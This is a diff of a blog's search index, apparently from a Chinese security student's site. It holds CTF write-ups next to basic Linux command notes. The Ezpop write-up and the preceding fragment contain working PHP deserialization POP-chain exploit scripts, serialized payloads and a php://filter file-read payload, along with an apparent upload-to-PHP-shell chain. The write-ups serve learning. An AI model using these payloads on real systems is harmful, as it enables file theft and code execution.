class="title">app</span>/<span class="title">web</span>/<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&quot;../public/upload/0392412bc2d05c02c9fc9c42c86c3fd3/9185d1d0b5e4e9faec46f10be786ecb8.png&quot;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;../public/upload/0392412bc2d05c02c9fc9c42c86c3fd3/qwe.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Register()</span><br><span class="line"><span class="variable">$a</span>-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;checker=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>))</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> wp </tag>
+            
+            <tag> 文件上传漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[MRCTF2020]Ezpop</title>
+      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5BMRCTF2020%5DEzpop/"/>
+      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5BMRCTF2020%5DEzpop/</url>
+      
+        <content type="html"><![CDATA[<p>__construct()//当一个对象创建时被调用</p><p>__destruct() //当一个对象销毁时被调用</p><p>__toString() //当一个对象被当作一个字符串使用</p><p>__sleep()//在对象在被序列化之前运行</p><p>__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</p><p>__get()//获得一个类的成员变量时调用</p><p>__set()//设置一个类的成员变量时调用</p><p>__invoke()//调用函数的方式调用一个对象时的回应方法</p><p>__call()//当调用一个对象中的不能用的方法的时候就会执行这个函数</p><p>此处用到的主要是__toString()，__wakeup()，__get()，__invoke()，</p><p>2.</p><p>类中，private变量与protected变量序列化后，变量名会有些异常，</p><p>private变量经反序列化后为\x00 + 类名 + \x00 + 变量名；</p><p>protected变量经反序列化后为，\x00 + * + \x00 + 变量名；</p><p>3.</p><p>列化操作只是保存对象(不是类)的变量，不保存对象的方法，其实反序列化的主要危害在于我们可以控制对象的变量来改变程序执行流程从而达到我们最终的目的。我们无法控制对象的方法来调用，因此我们这里只能去找一些可以自动调用的一些魔术方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到序列化</p><p>O:4:”Show”:2:{s:6:”source”;O:4:”Show”:2:{s:6:”source”;N;s:3:”str”;O:4:”Test”:1:{s:1:”p”;O:8:”Modifier”:1:{s:6:”*var”;s:52:”php://filter/convert.base64-encode/resource=flag.php”;}}}s:3:”str”;N;}</p><p>进行urlencode</p><p>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</p><p>得到base64</p><p>PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezQ3MWE5ZmQ0LWUzZGYtNDRiNi04ZDhjLTU4Mjc0MGU4M2ZmYn0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>= <span class="string">&quot;flag&#123;471a9fd4-e3df-44b6-8d8c-582740e83ffb&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Help Me Find FLAG!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> php </tag>
+            
+            <tag> wp </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>从XML到XXE漏洞+ctf实战</title>
       <link href="/2021/06/16/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/XXE%E6%BC%8F%E6%B4%9E/"/>
       <url>/2021/06/16/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/XXE%E6%BC%8F%E6%B4%9E/</url>
@@ -813,11 +813,49 @@
     
     
     <entry>
+      <title>关机与重启</title>
+      <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%85%B3%E6%9C%BA%E5%92%8C%E9%87%8D%E5%90%AF/"/>
+      <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%85%B3%E6%9C%BA%E5%92%8C%E9%87%8D%E5%90%AF/</url>
+      
+        <content type="html"><![CDATA[<h1 id="关机和重启"><a href="#关机和重启" class="headerlink" title="关机和重启"></a>关机和重启</h1><h2 id="1-shutdown"><a href="#1-shutdown" class="headerlink" title="1.shutdown"></a>1.shutdown</h2><p>[root@localhost ~]# shutdown[选项]<br>时间选项:<br>-c:取消前一个关机命令<br>-h:关机<br>-r:重启  </p><h2 id="其他关机命令"><a href="#其他关机命令" class="headerlink" title="其他关机命令"></a>其他关机命令</h2><p>halt<br>poweroff<br>init 0  </p><h2 id="其他重启命令"><a href="#其他重启命令" class="headerlink" title="其他重启命令"></a>其他重启命令</h2><p>reboot<br>init 6  </p><h1 id="系统运行级别"><a href="#系统运行级别" class="headerlink" title="系统运行级别"></a>系统运行级别</h1><p>0 关机<br>1 单用户(windows开机时 F8)<br>2  不完全用户，不含NFS(Network File Server)服务<br>3 完全多用户<br>4 未分配<br>5 图形界面<br>6 重启<br>cat /etc/inittab<br>修改系统的默认运行级别<br>id:3:initdefault:<br>runlevel<br>查看系统运行级别  </p><h1 id="logout"><a href="#logout" class="headerlink" title="logout"></a>logout</h1><p>退出登录    </p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>rpm命令管理</title>
       <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/rpm%E5%8C%85/rpm%E7%AE%A1%E7%90%86/"/>
       <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/rpm%E5%8C%85/rpm%E7%AE%A1%E7%90%86/</url>
       
         <content type="html"><![CDATA[<h1 id="rpm命令管理"><a href="#rpm命令管理" class="headerlink" title="rpm命令管理"></a>rpm命令管理</h1><p>树形依赖<br>环形依赖<br>模块依赖:<br><a href="http://www.rpmfind.net/linux/RPM/">www.rpmfind.net </a> </p><h1 id="yun在线依赖"><a href="#yun在线依赖" class="headerlink" title="yun在线依赖"></a>yun在线依赖</h1><h1 id="RPM安装"><a href="#RPM安装" class="headerlink" title="RPM安装"></a>RPM安装</h1><p>rpm -ivh 包全名<br>选项：<br>    -i(install)<br>    -v(verbose)<br>    -h(hash)<br>    –nodeps<br>rmp -Uvh 包全名 更新<br>rmp -e 包名 卸载   </p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>帮助命令</title>
+      <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%B8%AE%E5%8A%A9%E5%91%BD%E4%BB%A4/"/>
+      <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%B8%AE%E5%8A%A9%E5%91%BD%E4%BB%A4/</url>
+      
+        <content type="html"><![CDATA[<h1 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h1><h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p>命令英文原意: manual<br>命令所在路径:/usr/bin/man<br>执行权限:所有用户<br>语法: man[命令或配置文件]<br>功能描述:获得帮助信息范例:$ man ls<br>查看ls命令的帮助信息$ man services<br>查看配置文件services的帮助信息<br>当查看配置文件时不需要文件的绝对路径，只需添加文件的名称<br>1表示对命令的帮助 5表示对配置文件的帮助<br>man 5 passwd  </p><h2 id="whatis-amp-apropos"><a href="#whatis-amp-apropos" class="headerlink" title="whatis &amp; apropos"></a>whatis &amp; apropos</h2><p>whatis和apropos都可以查命令和配置文件。 </p><h2 id="–help"><a href="#–help" class="headerlink" title="–help"></a>–help</h2><p>eg: ls –help</p><h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><p>命令所在路径:Shell<br>内置命令执行权限:所有用户<br>语法: help命令<br>功能描述:获得Shell内置命令的帮助信息<br>eg:$ help umask<br>查看umask命令的帮助信息<br><img src="/.io//img/linux.jpeg" alt="linux"></p>]]></content>
       
       
       
@@ -851,49 +889,11 @@
     
     
     <entry>
-      <title>关机与重启</title>
-      <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%85%B3%E6%9C%BA%E5%92%8C%E9%87%8D%E5%90%AF/"/>
-      <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%85%B3%E6%9C%BA%E5%92%8C%E9%87%8D%E5%90%AF/</url>
-      
-        <content type="html"><![CDATA[<h1 id="关机和重启"><a href="#关机和重启" class="headerlink" title="关机和重启"></a>关机和重启</h1><h2 id="1-shutdown"><a href="#1-shutdown" class="headerlink" title="1.shutdown"></a>1.shutdown</h2><p>[root@localhost ~]# shutdown[选项]<br>时间选项:<br>-c:取消前一个关机命令<br>-h:关机<br>-r:重启  </p><h2 id="其他关机命令"><a href="#其他关机命令" class="headerlink" title="其他关机命令"></a>其他关机命令</h2><p>halt<br>poweroff<br>init 0  </p><h2 id="其他重启命令"><a href="#其他重启命令" class="headerlink" title="其他重启命令"></a>其他重启命令</h2><p>reboot<br>init 6  </p><h1 id="系统运行级别"><a href="#系统运行级别" class="headerlink" title="系统运行级别"></a>系统运行级别</h1><p>0 关机<br>1 单用户(windows开机时 F8)<br>2  不完全用户，不含NFS(Network File Server)服务<br>3 完全多用户<br>4 未分配<br>5 图形界面<br>6 重启<br>cat /etc/inittab<br>修改系统的默认运行级别<br>id:3:initdefault:<br>runlevel<br>查看系统运行级别  </p><h1 id="logout"><a href="#logout" class="headerlink" title="logout"></a>logout</h1><p>退出登录    </p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> linux </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>压缩解压命令</title>
       <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%8E%8B%E7%BC%A9%E8%A7%A3%E5%8E%8B%E5%91%BD%E4%BB%A4/"/>
       <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%8E%8B%E7%BC%A9%E8%A7%A3%E5%8E%8B%E5%91%BD%E4%BB%A4/</url>
       
         <content type="html"><![CDATA[<h1 id="压缩解压命令"><a href="#压缩解压命令" class="headerlink" title="压缩解压命令"></a>压缩解压命令</h1><h2 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h2><p>命令英文原意:GNUzip<br>命令所在路径:/bin/gzip<br>执行权限:所有用户<br>语法: gzip[文件]<br>功能描述:压缩文件压缩后<br>文件格式:.gZ  </p><h2 id="gunzip"><a href="#gunzip" class="headerlink" title="gunzip"></a>gunzip</h2><p>命令英文原意:GNUunzip<br>命令所在路径:/bin/gunzip<br>执行权限:所有用户<br>语法: gunzip[压缩文件]<br>功能描述:解压缩.gz的压缩文件  </p><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><p>命令所在路径:/bin/tar<br>执行权限:所有用户<br>语法: tar选项[-zcf][压缩后文件名][目录]<br>-c 打包<br>-v 显示详细信息<br>-f 指定文件名<br>-z 打包同时压缩<br>功能描述:打包目录<br>eg: tar <strong>-zcf</strong> ec.tar.gz ec<br>打包ec 并压缩成ec文件<br>tar -zxf etc.tar.gz //解压</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>命令所在路径:/usr/bin/zip<br>执行权限:所有用户<br>语法:zip 选项[-r][压缩后文件名][文件或目录]<br>-r 压缩目录<br>功能描述:压缩文件或目录<br>压缩后文件格式:.zip<br>能保留源文件</p><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>解压缩</p><h2 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2"></a>bzip2</h2><p>命令所在路径:/usr/bin/bzip2<br>执行权限:所有用户<br>语法: bzip2选项[-k][文件]<br><strong>-k产生压缩文件后保留原文件</strong><br>功能描述:压缩文件<br>压缩后文件格式:.bz2<br>bzip2 -k et<br>tar -cjf et.tar.bz2 et  //压缩<br>tar -xjf et.tar.bz2 //解压缩</p><h2 id="bunzip2"><a href="#bunzip2" class="headerlink" title="bunzip2"></a>bunzip2</h2><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><table><thead><tr><th>格式</th><th>.gz</th><th>.tar</th><th>.tar.gz</th><th>.zip</th><th>.bz2</th><th>.tar.bz2</th></tr></thead><tbody><tr><td>压缩</td><td>gzip</td><td>tar -cf</td><td>tar -zcf</td><td>zip -r</td><td>bzip2</td><td>tar -cjf</td></tr><tr><td>解压</td><td>gunzip(gzip -d)</td><td>-xf</td><td>-zxf</td><td>unzip</td><td>bunzip2</td><td>-xjf</td></tr></tbody></table>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> linux </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>帮助命令</title>
-      <link href="/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%B8%AE%E5%8A%A9%E5%91%BD%E4%BB%A4/"/>
-      <url>/2021/04/07/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E5%B8%AE%E5%8A%A9%E5%91%BD%E4%BB%A4/</url>
-      
-        <content type="html"><![CDATA[<h1 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h1><h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p>命令英文原意: manual<br>命令所在路径:/usr/bin/man<br>执行权限:所有用户<br>语法: man[命令或配置文件]<br>功能描述:获得帮助信息范例:$ man ls<br>查看ls命令的帮助信息$ man services<br>查看配置文件services的帮助信息<br>当查看配置文件时不需要文件的绝对路径，只需添加文件的名称<br>1表示对命令的帮助 5表示对配置文件的帮助<br>man 5 passwd  </p><h2 id="whatis-amp-apropos"><a href="#whatis-amp-apropos" class="headerlink" title="whatis &amp; apropos"></a>whatis &amp; apropos</h2><p>whatis和apropos都可以查命令和配置文件。 </p><h2 id="–help"><a href="#–help" class="headerlink" title="–help"></a>–help</h2><p>eg: ls –help</p><h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><p>命令所在路径:Shell<br>内置命令执行权限:所有用户<br>语法: help命令<br>功能描述:获得Shell内置命令的帮助信息<br>eg:$ help umask<br>查看umask命令的帮助信息<br><img src="/.io//img/linux.jpeg" alt="linux"></p>]]></content>
       
       
       
@@ -965,11 +965,11 @@
     
     
     <entry>
-      <title>网络命令</title>
-      <link href="/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4/"/>
-      <url>/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4/</url>
+      <title>权限管理命令</title>
+      <link href="/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/"/>
+      <url>/2021/04/06/Linux%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/</url>
       
-        <content type="html"><![CDATA[<h1 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h1><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>指令所在路径: /usr/bin/write<br>执行权限:所有用户<br>语法: write&lt;用户名&gt;<br>功能描述:给用户发信息，以Ctrl+D保存结束  </p><h2 id="wall"><a href="#wall" class="headerlink" title="wall"></a>wall</h2><p>命令英文原意:write all<br>指令所在路径:/usr/bin/wall<br>执行权限:所有用户<br>语法: wall [message]<br>功能描述:发广播信息  </p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>命令所在路径:/bin/ping<br>执行权限:所有用户<br>语法: ping选项IP地址<br>-c指定发送次数<br>功能描述:测试网络连通性   </p><h2 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h2><p>命令英文原意: interface configure<br>命令所在路径:/sbin/ifconfig<br>执行权限: root<br>语法: ifconfig网卡名称IP地址<br>功能描述:查看和设置网卡信息  </p><h2 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h2><p>命令所在路径:/bin/mail<br>执行权限:所有用户语法: mail [用户名]<br>功能描述:查看发送电子邮件  </p><h2 id="last"><a href="#last" class="headerlink" title="last"></a>last</h2><p>命令所在路径:/usr/bin/last<br>执行权限:所有用户<br>语法: last<br>功能描述:列出目前与过去登入系统的用户信息  </p><h2 id="lastlog"><a href="#lastlog" class="headerlink" title="lastlog"></a>lastlog</h2><p>命令所在路径:/usr/bin/lastlog<br>执行权限:所有用户<br>语法: lastlog<br>功能描述:检查某特定用户上次登录的时间<br>-u 加id只查看该用户   </p><h2 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h2><p>命令所在路径:/bin/traceroute<br>执行权限:所有用户<br>语法: traceroute<br>功能描述:显示数据包到主机间的路径<br>traceroute <a href="http://www.baidu.com/">www.baidu.com</a>  </p><h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p>命令所在路径:/bin/netstat<br>执行权限:所有用户<br>语法: netstat[选项]<br>功能描述:显示网络相关信息<br>-t tcp协议<br>-u UDP协议<br>-l 监听<br>-r 路由<br>-n 显示ip地址和端口号<br>服务发起端口是随机的，只有接收端口是固定的<br>netstat -tlun<br>查看本机监听的端口<br>netstat -an<br>查看本机所有的网络连接<br>#netstat -rn<br>查看本机路由表  </p><h2 id="setup-redhat"><a href="#setup-redhat" class="headerlink" title="setup (redhat)"></a>setup (redhat)</h2><p>命令所在路径:/usr/bin/setup<br>执行权限:root<br>语法: setup<br>功能描述:配置网络  </p><h2 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h2><p>命令位置:/bin/mount<br>执行权限:所有用户<br>命令语法: mount [-t文件系统]设备文件名挂载点<br>范例:# mount -t iso9660 /dev/sr0 /mnt/cdrom  </p>]]></content>
